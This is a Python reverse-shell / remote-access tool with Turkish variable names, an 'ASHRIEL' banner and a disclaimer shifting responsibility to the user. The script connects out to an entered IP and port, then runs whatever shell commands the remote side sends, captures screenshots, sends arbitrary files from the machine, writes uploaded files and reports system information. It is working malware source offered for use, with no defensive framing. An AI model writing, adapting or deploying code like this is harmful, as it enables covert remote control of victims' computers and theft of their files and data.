import socket
import subprocess
import os
import platform
print("""
░█████╗░░██████╗██╗░░██╗██████╗░██╗███████╗██╗░░░░░
██╔══██╗██╔════╝██║░░██║██╔══██╗██║██╔════╝██║░░░░░
███████║╚█████╗░███████║██████╔╝██║█████╗░░██║░░░░░
██╔══██║░╚═══██╗██╔══██║██╔══██╗██║██╔══╝░░██║░░░░░
██║░░██║██████╔╝██║░░██║██║░░██║██║███████╗███████╗
╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝╚══════╝╚══════╝
""")
print("DİKKAT BU UYGULAMAYI KULLANIRKEN BÜTÜN SORUMLULUĞU ÜSTLENMİŞ OLURSUNUZ!!")

def baglan(hedef_ip, hedef_port):
    try:
        soket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        soket.connect((hedef_ip, hedef_port))
        print(f"{hedef_ip}:{hedef_port} adresine bağlanılıyor...")
        
        while True:
            komut = soket.recv(1024).decode()
            if komut.lower() == 'exit':
                break
            elif komut.lower() == 'screenshot':
                ekran_goruntusu = subprocess.check_output(['screencapture', '-x', '-'])
                soket.send(ekran_goruntusu)
            elif komut.lower().startswith('download'):
                dosya_yolu = komut.split(' ')[1]
                try:
                    with open(dosya_yolu, 'rb') as dosya:
                        dosya_verisi = dosya.read()
                    soket.send(dosya_verisi)
                except FileNotFoundError:
                    soket.send("Dosya bulunamadı!")
            elif komut.lower().startswith('upload'):
                dosya_adi = komut.split(' ')[1]
                dosya_verisi = soket.recv(1024)
                with open(dosya_adi, 'wb') as dosya:
                    dosya.write(dosya_verisi)
            elif 'cd ' in komut:
                dizin = komut.split(' ')[1]
                try:
                    os.chdir(dizin)
                    soket.send(f"Dizin değiştirildi: {os.getcwd()}".encode())
                except Exception as cd_hata:
                    soket.send(str(cd_hata).encode())
            elif komut.lower() == 'systeminfo':
                if platform.system() == 'Darwin':
                    bilgi = subprocess.check_output(['system_profiler'])
                elif platform.system() == 'Windows':
                    bilgi = subprocess.check_output(['systeminfo'])
                else:
                    bilgi = "Sistem bilgisi alınamadı."
                soket.send(bilgi)
            else:
                try:
                    sonuc = subprocess.check_output(komut, shell=True, stderr=subprocess.STDOUT)
                    soket.send(sonuc)
                except Exception as hata:
                    soket.send(str(hata).encode())

        soket.close()
    except Exception as hata:
        print("Bağlantı hatası:", hata)

def main():
    hedef_ip = input("Hedef IP adresini girin: ")
    hedef_port = int(input("Hedef portu girin: "))

    baglan(hedef_ip, hedef_port)

if __name__ == "__main__":
    main()
